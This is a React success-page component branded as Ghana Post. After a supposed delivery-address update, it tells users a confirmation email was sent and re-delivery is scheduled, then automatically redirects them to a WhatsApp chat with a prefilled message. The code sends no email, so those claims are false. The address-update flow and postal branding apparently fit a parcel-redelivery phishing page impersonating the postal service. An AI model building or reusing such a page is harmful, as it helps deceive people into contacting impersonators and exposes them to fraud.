import React, { useEffect } from 'react';

function SuccessPage() {
  useEffect(() => {
    // Redirect to WhatsApp on component mount
    const whatsappNumber = '233800800800'; // Ghana Post customer service
    const message = encodeURIComponent(
      `Hello! I have successfully updated my delivery address. Please confirm receipt of this update and provide an estimated delivery date.`
    );
    window.location.href = `https://wa.me/${whatsappNumber}?text=${message}`;
  }, []);

  return (
    <div className="container">
      <div className="success-message" style={{ marginTop: '4rem', marginBottom: '4rem' }}>
        <div style={{ fontSize: '3rem', marginBottom: '1rem' }}>✅</div>
        <h2>Delivery Address Updated!</h2>
        <p style={{ fontSize: '1.1rem', marginBottom: '1rem' }}>
          Your delivery address has been successfully saved.
        </p>
        <p>
          Your package will be re-delivered to the updated address within <strong>2-3 business days</strong>.
        </p>
        <div style={{ marginTop: '2rem', fontSize: '0.9rem', lineHeight: '1.8' }}>
          <p>📧 A confirmation email has been sent to your email address.</p>
          <p>📍 You can track your delivery status using your package number.</p>
          <p>📞 Connecting to Ghana Post on WhatsApp...</p>
        </div>
        <div style={{ marginTop: '2rem' }}>
          <p style={{ color: '#999', fontSize: '0.9rem' }}>If you are not redirected, please message us at +233 800 800 800</p>
        </div>
      </div>
    </div>
  );
}

export default SuccessPage;
